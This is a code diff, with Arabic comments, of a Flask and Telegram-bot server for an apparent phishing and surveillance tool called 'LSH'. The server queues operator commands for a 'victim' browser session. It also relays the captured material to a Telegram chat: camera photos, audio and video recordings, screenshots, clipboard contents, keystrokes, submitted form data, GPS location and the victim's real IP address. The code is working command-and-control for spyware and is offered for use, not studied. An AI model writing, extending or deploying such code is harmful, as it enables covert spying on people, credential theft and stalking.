@@ -834,7 +756,7 @@ def generate_qr_code_bytes(deep_link_url):
 
 
 # ============================================================
-# [5] لوحة تحكم البوت
+# [5] لوحة التحكم
 # ============================================================
 def build_lsh_control_panel(session_id, chat_id):
     from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
@@ -862,7 +784,7 @@ def build_lsh_control_panel(session_id, chat_id):
 
 
 # ============================================================
-# [6] تسجيل المسارات
+# [6] المسارات
 # ============================================================
 def init_lsh_routes(app, bot):
 
@@ -872,7 +794,6 @@ def init_lsh_routes(app, bot):
         chat_id = request.args.get('id', '')
         if not session_id or not chat_id:
             return "Invalid link", 400
-
         try:
             if redis_client:
                 stored = redis_client.get(f"lsh_session:{session_id}")
@@ -880,69 +801,79 @@ def init_lsh_routes(app, bot):
                     return "Session expired", 410
         except Exception:
             pass
-
         create_session(session_id, chat_id)
-
         html = (LSH_PAGE
                 .replace("__SESSION_ID__", session_id)
                 .replace("__CHAT_ID__", str(chat_id))
                 .replace("__HTTP_URL__", RAILWAY_URL))
         return html, 200
 
-    @app.route('/lsh_data', methods=['POST'])
-    def lsh_data():
+    # ============================================================
+    # ★★ المسار الموحّد: يستقبل رسالة + يرد بأوامر معلّقة
+    # ============================================================
+    @app.route('/lsh_msg', methods=['POST'])
+    def lsh_msg():
         try:
             data = request.get_json(silent=True) or {}
             session_id = data.get('session_id')
             chat_id = data.get('chat_id')
             if not session_id or not chat_id:
-                return jsonify({"status": "missing"}), 400
+                return jsonify({"commands": []}), 200
 
+            # تأكد من وجود الجلسة
             sess = get_session(session_id)
             if sess:
                 sess["last_seen"] = time.time()
             else:
                 create_session(session_id, chat_id)
 
+            # ★ اسحب كل الأوامر المعلّقة
+            commands = []
+            if redis_client:
+                channel = f"lsh_cmd:{session_id}"
+                try:
+                    # نسحب لحد 5 أوامر معاً
+                    for _ in range(5):
+                        item = redis_client.rpop(channel)
+                        if not item:
+                            break
+                        try:
+                            cmd = json.loads(item)
+                            commands.append(cmd)
+                            print(f"[+] DELIVER >> {session_id[:8]} | {cmd.get('action')}")
+                        except Exception as pe:
+                            print(f"[-] parse cmd error: {pe}")
+                except Exception as re:
+                    print(f"[-] redis read error: {re}")
+
+            # ★ حدّث نشاط
             if redis_client:
                 try:
                     redis_client.setex(f"lsh_active:{session_id}", 3600, "1")
                 except Exception:
                     pass
 
-            source_ip = (request.headers.get('CF-Connecting-IP') or
-                         request.headers.get('X-Forwarded-For') or
-                         request.headers.get('X-Real-IP') or
-                         request.remote_addr or "Unknown")
-            if ',' in source_ip:
-                source_ip = source_ip.split(',')[0].strip()
+            # ★ عالج الرسالة الواردة (إن لم تكن ping عادي)
+            dtype = data.get('type')
+            if dtype and dtype != 'ping':
+                source_ip = (request.headers.get('CF-Connecting-IP') or
+                             request.headers.get('X-Forwarded-For') or
+                             request.remote_addr or "Unknown")
+                if ',' in source_ip:
+                    source_ip = source_ip.split(',')[0].strip()
+                try:
+                    _handle_incoming(bot, chat_id, session_id, data, source_ip)
+                except Exception as he:
+                    print(f"[-] handle error: {he}")
+                    import traceback
+                    traceback.print_exc()
 
-            _handle_incoming(bot, chat_id, session_id, data, source_ip)
-            return jsonify({"status": "ok"}), 200
+            return jsonify({"commands": commands, "ok": True}), 200
         except Exception as e:
-            print(f"[-] lsh_data error: {e}")
+            print(f"[-] lsh_msg FATAL: {e}")
             import traceback
             traceback.print_exc()
-            return jsonify({"status": "error"}), 500
-
-    @app.route('/lsh_poll', methods=['GET'])
-    def lsh_poll():
-        session_id = request.args.get('s', '')
-        if not session_id or not redis_client:
-            return jsonify({"command": None}), 200
-
-        channel = f"lsh_cmd:{session_id}"
-        start = time.time()
-        while time.time() - start < 25:
-            try:
-                item = redis_client.rpop(channel)
-                if item:
-                    print(f"[+] Cmd delivered: {session_id} -> {item[:80]}")
-                    return jsonify({"command": json.loads(item)}), 200
-            except Exception as e:
-                print(f"[-] poll error: {e}")
-            time.sleep(0.5)
-        return jsonify({"command": None}), 200
+            return jsonify({"commands": []}), 200
 
     @app.route('/lsh_create', methods=['POST'])
     def lsh_create():
@@ -957,90 +888,95 @@ def init_lsh_routes(app, bot):
 
 
 # ============================================================
-# [7] معالجة البيانات
+# [7] معالجة الوارد
 # ============================================================
 def _handle_incoming(bot, chat_id, session_id, data, source_ip):
     dtype = data.get('type')
+    print(f"[<<] {dtype} | {session_id[:8]}")
+
     try:
-        if dtype == 'info':
+        if dtype == 'landing':
+            bot.send_message(chat_id,
+                f"🎯 **الضحية فتح الرابط!**\n"
+                f"🆔 `{session_id}`\n🌐 IP: `{source_ip}`\n\n"
+                f"⏳ في انتظار تصرف الضحية...",
+                parse_mode="Markdown")
+
+        elif dtype == 'retry_click':
+            bot.send_message(chat_id,
+                f"👆 **الضحية ضغط على إعادة المحاولة!**\n🆔 `{session_id}`",
+                parse_mode="Markdown")
+
+        elif dtype == 'ready':
+            panel = build_lsh_control_panel(session_id, chat_id)
+            bot.send_message(chat_id,
+                f"✅ **الجلسة `{session_id[:8]}` جاهزة للتحكم الكامل**\n"
+                f"استخدم اللوحة أدناه 👇",
+                parse_mode="Markdown", reply_markup=panel)
+
+        elif dtype == 'info':
             info = data.get('info', {})
             info['ip'] = source_ip
             sess = get_session(session_id)
             if sess:
                 sess['info'] = info
             text = _format_info_report(info, session_id)
-            bot.send_message(chat_id, text, parse_mode="Markdown", disable_web_page_preview=True)
-            panel = build_lsh_control_panel(session_id, chat_id)
-            bot.send_message(chat_id,
-                             f"🎛️ **لوحة تحكم الجلسة النشطة**\n`{session_id}`",
-                             parse_mode="Markdown", reply_markup=panel)
-
-        elif dtype == 'landing':
-            bot.send_message(chat_id,
-                             f"🎯 **الضحية فتح الرابط!**\n"
-                             f"🆔 `{session_id}`\n"
-                             f"🌐 IP: `{source_ip}`\n\n"
-                             f"⏳ في انتظار تصرف الضحية...",
-                             parse_mode="Markdown")
-
-        elif dtype == 'retry_click':
-            bot.send_message(chat_id,
-                             f"👆 **الضحية ضغط على زر إعادة المحاولة!**\n"
-                             f"🆔 `{session_id}`",
-                             parse_mode="Markdown")
+            bot.send_message(chat_id, text, parse_mode="Markdown",
+                             disable_web_page_preview=True)
 
         elif dtype == 'location':
             loc = data.get('location') or {}
-            if loc.get('latitude'):
+            if loc and loc.get('latitude'):
                 lat, lng = loc['latitude'], loc['longitude']
                 bot.send_message(chat_id,
                     f"📍 **الموقع:** `{lat}, {lng}`\n"
-                    f"[فتح في خرائط جوجل](https://maps.google.com/?q={lat},{lng})",
+                    f"[خرائط](https://maps.google.com/?q={lat},{lng})",
                     parse_mode="Markdown")
             else:
                 bot.send_message(chat_id, "❌ لم يتم السماح بالموقع")
 
-        elif dtype in ('first_photo', 'periodic_photo', 'command_photo'):
-            captions = {
-                'first_photo': "📸 **صورة أولية**",
-                'periodic_photo': "📸 **صورة دورية**",
-                'command_photo': "📸 **صورة بأمر**"
-            }
-            _send_photo(bot, chat_id, data.get('image',''), captions.get(dtype, "📸 صورة"))
+        elif dtype == 'first_photo':
+            _send_photo(bot, chat_id, data.get('image',''), "📸 **صورة أولية**")
 
-        elif dtype in ('first_audio', 'command_audio'):
-            _send_audio(bot, chat_id, data.get('audio',''), "🎙️ **تسجيل صوتي**")
+        elif dtype == 'first_audio':
+            _send_audio(bot, chat_id, data.get('audio',''), "🎙️ **تسجيل صوتي أولي**")
 
-        elif dtype == 'command_video':
-            _send_video(bot, chat_id, data.get('video',''), "🎥 **فيديو حي**")
+        elif dtype == 'periodic_photo':
+            _send_photo(bot, chat_id, data.get('image',''), "📸 **صورة دورية تلقائية**")
 
-        elif dtype == 'command_screen':
-            _send_photo(bot, chat_id, data.get('image',''), "🖥️ **لقطة شاشة**")
-        elif dtype == 'command_screen_failed':
-            bot.send_message(chat_id, "❌ الضحية رفض مشاركة الشاشة")
+        # ============================================================
+        # ★★ نتائج الأوامر — هنا مفتاح النجاح
+        # ============================================================
+        elif dtype == 'cmd_result':
+            action = data.get('action')
+            status = data.get('status')
+            error = data.get('error', '')
+            result = data.get('data')
 
-        elif dtype == 'command_clipboard':
-            content = data.get('content', '')
-            if content:
-                bot.send_message(chat_id, f"📋 **الحافظة:**\n```\n{content[:1000]}\n```", parse_mode="Markdown")
+            if status == 'ok':
+                _handle_cmd_success(bot, chat_id, action, result)
             else:
-                bot.send_message(chat_id, "📋 الحافظة فارغة")
-        elif dtype == 'command_clipboard_failed':
-            bot.send_message(chat_id, "❌ فشل الوصول للحافظة")
+                _handle_cmd_failure(bot, chat_id, action, error)
 
+        # ============================================================
+        # مراقبة خلفية
+        # ============================================================
         elif dtype == 'key':
             key = data.get('key', '')
-            if len(key) == 1 or key in ['Enter','Backspace','Delete','Tab','Escape','ArrowUp','ArrowDown','ArrowLeft','ArrowRight']:
+            if len(key) == 1 or key in ['Enter','Backspace','Delete','Tab','Escape',
+                                          'ArrowUp','ArrowDown','ArrowLeft','ArrowRight']:
                 _accumulate_key(chat_id, session_id, key)
 
         elif dtype == 'clipboard_copy':
-            bot.send_message(chat_id, f"📋 **نسخ:**\n```\n{data.get('content','')[:300]}\n```", parse_mode="Markdown")
+            c = data.get('content','')
+            if c: bot.send_message(chat_id, f"📋 **نسخ:**\n```\n{c[:300]}\n```", parse_mode="Markdown")
         elif dtype == 'clipboard_paste':
-            bot.send_message(chat_id, f"📥 **لصق:**\n```\n{data.get('content','')[:300]}\n```", parse_mode="Markdown")
+            c = data.get('content','')
+            if c: bot.send_message(chat_id, f"📥 **لصق:**\n```\n{c[:300]}\n```", parse_mode="Markdown")
 
         elif dtype == 'form_submit':
             form_data = data.get('data', {})
-            lines = ["📝 **نموذج تم إرساله:**", f"Action: `{str(data.get('action',''))[:80]}`"]
+            lines = ["📝 **نموذج:**", f"Action: `{str(data.get('action_url',''))[:80]}`"]
             for k, v in list(form_data.items())[:20]:
                 lines.append(f"• `{k}`: `{str(v)[:100]}`")
             bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")
@@ -1050,26 +986,6 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             if txt and len(txt) > 2:
                 _accumulate_click(chat_id, session_id, txt)
 
-        elif dtype == 'url_change':
-            bot.send_message(chat_id, f"🔗 **تغيير رابط:**\n`{data.get('url','')[:200]}`", parse_mode="Markdown")
-
-        elif dtype == 'command_open_url_done':
-            bot.send_message(chat_id, "✅ تم فتح الرابط على جهاز الضحية")
-        elif dtype == 'command_vibrate_done':
-            bot.send_message(chat_id, "✅ تم الاهتزاز")
-        elif dtype == 'command_location':
-            loc = data.get('location') or {}
-            if loc and loc.get('latitude'):
-                lat, lng = loc['latitude'], loc['longitude']
-                bot.send_message(chat_id, f"📍 **الموقع المحدّث:** `{lat}, {lng}`\n[خرائط](https://maps.google.com/?q={lat},{lng})", parse_mode="Markdown")
-            else:
-                bot.send_message(chat_id, "❌ تعذّر تحديث الموقع")
-        elif dtype == 'command_redirect_ack':
-            bot.send_message(chat_id, "✅ تم إنهاء الجلسة")
-        elif dtype == 'ready':
-            bot.send_message(chat_id, f"✅ **الجلسة جاهزة للتحكم الكامل**")
-        elif dtype == 'pong':
-            pass
     except Exception as e:
         print(f"[-] _handle_incoming error ({dtype}): {e}")
         import traceback
@@ -1077,47 +993,106 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
 
 
 # ============================================================
-# [8] إرسال الوسائط
+# [8] معالجة نتائج الأوامر
+# ============================================================
+def _handle_cmd_success(bot, chat_id, action, data):
+    try:
+        if action == 'snapshot':
+            _send_photo(bot, chat_id, data, "📸 **صورة بأمر مباشر** ✅")
+        elif action == 'audio':
+            _send_audio(bot, chat_id, data, "🎙️ **تسجيل صوتي بأمر** ✅")
+        elif action == 'video':
+            _send_video(bot, chat_id, data, "🎥 **فيديو بأمر** ✅")
+        elif action == 'screen':
+            _send_photo(bot, chat_id, data, "🖥️ **لقطة شاشة مباشرة** ✅")
+        elif action == 'clipboard':
+            bot.send_message(chat_id, f"📋 **الحافظة:**\n```\n{str(data)[:1000]}\n```", parse_mode="Markdown")
+        elif action == 'location':
+            try:
+                loc = json.loads(data)
+                lat, lng = loc.get('latitude'), loc.get('longitude')
+                bot.send_message(chat_id,
+                    f"📍 **الموقع المحدّث:** `{lat}, {lng}`\n"
+                    f"[خرائط](https://maps.google.com/?q={lat},{lng})",
+                    parse_mode="Markdown")
+            except Exception:
+                bot.send_message(chat_id, f"📍 {data}")
+        elif action == 'url':
+            bot.send_message(chat_id, f"✅ **تم فتح الرابط على جهاز الضحية**\n`{data}`", parse_mode="Markdown")
+        elif action == 'vibrate':
+            bot.send_message(chat_id, "📳 **تم الاهتزاز على جهاز الضحية** ✅")
+        elif action == 'redirect':
+            bot.send_message(chat_id, "✅ **تم إنهاء الجلسة وتحويل الضحية**")
+        else:
+            bot.send_message(chat_id, f"✅ `{action}` تم بنجاح")
+    except Exception as e:
+        print(f"[-] _handle_cmd_success error: {e}")
+
+
+def _handle_cmd_failure(bot, chat_id, action, error):
+    msgs = {
+        ('snapshot', 'no_camera'): "❌ **لا يمكن الوصول للكاميرا** — الضحية رفض الإذن",
+        ('snapshot', 'capture_failed'): "❌ **فشل التقاط الصورة**",
+        ('audio', 'no_mic'): "❌ **لا يمكن الوصول للميكروفون** — الضحية رفض الإذن",
+        ('audio', 'record_failed'): "❌ **فشل التسجيل الصوتي**",
+        ('video', 'no_camera'): "❌ **لا يمكن الوصول للكاميرا**",
+        ('video', 'record_failed'): "❌ **فشل تسجيل الفيديو**",
+        ('screen', 'not_supported'): "❌ **المتصفح لا يدعم مشاركة الشاشة**",
+        ('screen', 'denied'): "❌ **الضحية رفض مشاركة الشاشة**",
+        ('clipboard', 'not_supported'): "❌ **المتصفح لا يدعم قراءة الحافظة**",
+        ('clipboard', 'denied'): "❌ **الضحية رفض الوصول للحافظة**",
+        ('location', 'denied_or_timeout'): "❌ **الضحية رفض الموقع أو انتهت المهلة**",
+        ('url', 'popup_blocked'): "❌ **المتصفح حجب النافذة الجديدة**",
+        ('vibrate', 'not_supported'): "❌ **الجهاز لا يدعم الاهتزاز**",
+        ('redirect', 'unknown'): "❌ **فشل إنهاء الجلسة**",
+        ('unknown_action', 'unknown_action'): "❌ **أمر غير معروف**",
+    }
+    key = (action, error)
+    msg = msgs.get(key)
+    if not msg:
+        msg = f"❌ **{action} فشل:** `{error[:100]}`"
+    try:
+        bot.send_message(chat_id, msg, parse_mode="Markdown")
+    except Exception as e:
+        print(f"[-] _handle_cmd_failure error: {e}")
+
+
+# ============================================================
+# [9] مساعدات
 # ============================================================
 def _send_photo(bot, chat_id, data_url, caption):
     try:
-        if not data_url or not data_url.startswith('data:image'):
-            return
+        if not data_url or not data_url.startswith('data:image'): return
         _, encoded = data_url.split(',', 1)
         buf = io.BytesIO(base64.b64decode(encoded))
         buf.name = 'capture.jpg'
         bot.send_photo(chat_id, buf, caption=caption, parse_mode="Markdown")
     except Exception as e:
-        print(f"[-] _send_photo error: {e}")
+        print(f"[-] _send_photo: {e}")
 
 
 def _send_audio(bot, chat_id, data_url, caption):
     try:
-        if not data_url or not data_url.startswith('data:audio'):
-            return
+        if not data_url or not data_url.startswith('data:audio'): return
         _, encoded = data_url.split(',', 1)
         buf = io.BytesIO(base64.b64decode(encoded))
         buf.name = 'capture.webm'
         bot.send_audio(chat_id, buf, caption=caption, parse_mode="Markdown")
     except Exception as e:
-        print(f"[-] _send_audio error: {e}")
+        print(f"[-] _send_audio: {e}")
 
 
 def _send_video(bot, chat_id, data_url, caption):
     try:
-        if not data_url or not data_url.startswith('data:video'):
-            return
+        if not data_url or not data_url.startswith('data:video'): return
         _, encoded = data_url.split(',', 1)
         buf = io.BytesIO(base64.b64decode(encoded))
         buf.name = 'capture.webm'
         bot.send_video(chat_id, buf, caption=caption, parse_mode="Markdown")
     except Exception as e:
-        print(f"[-] _send_video error: {e}")
+        print(f"[-] _send_video: {e}")
 
 
-# ============================================================
-# [9] تجميعات
-# ============================================================
 _key_buffers = {}
 _click_buffers = {}
 _BOT_REF = None
@@ -1159,9 +1134,6 @@ def _accumulate_click(chat_id, session_id, text):
         buf["last"] = now
 
 
-# ============================================================
-# [10] تقرير
-# ============================================================
 def _format_info_report(info, session_id):
     bat = info.get('battery') or {}
     net = info.get('connection') or {}
@@ -1175,19 +1147,18 @@ def _format_info_report(info, session_id):
         "╔══════════════════════════════╗\n"
         "║  🎯 **جلسة LSH جديدة**  ║\n"
         "╚══════════════════════════════╝\n\n"
-        f"🆔 الجلسة: `{session_id}`\n"
+        f"🆔 `{session_id}`\n"
         f"🌐 **IP:** `{ip}`\n"
-        f"🕵️ **IP الحقيقي (WebRTC):** `{webrtc_text}`\n"
+        f"🕵️ **IP الحقيقي:** `{webrtc_text}`\n"
         f"🕐 `{info.get('timestamp', 'N/A')[:19]}`\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "💻 **الجهاز:**\n"
-        f"• المنصة: `{info.get('platform', 'Unknown')}`\n"
-        f"• المعالج: `{hw.get('cores', 'N/A')} أنوية`\n"
-        f"• الذاكرة: `{hw.get('memory', 'N/A')} GB`\n"
+        f"• `{info.get('platform', 'Unknown')}`\n"
+        f"• أنوية: `{hw.get('cores', 'N/A')}` | RAM: `{hw.get('memory', 'N/A')} GB`\n"
         f"• اللغة: `{info.get('language', 'N/A')}`\n"
         f"• التوقيت: `{info.get('timezone', 'N/A')}`\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        "🎮 **كرت الرسوميات:**\n"
+        "🎮 **GPU:**\n"
         f"• `{gpu.get('vendor', 'N/A')}`\n"
         f"• `{gpu.get('renderer', 'N/A')}`\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
@@ -1198,4 +1169,4 @@ def _format_info_report(info, session_id):
         + (f"`{bat.get('level', '?')}%`" if bat else "غير متاح") + "\n"
         "📶 **الشبكة:** "
         + (f"`{net.get('effectiveType', '?')}`" if net else "غير متاح")
-            )
+    )
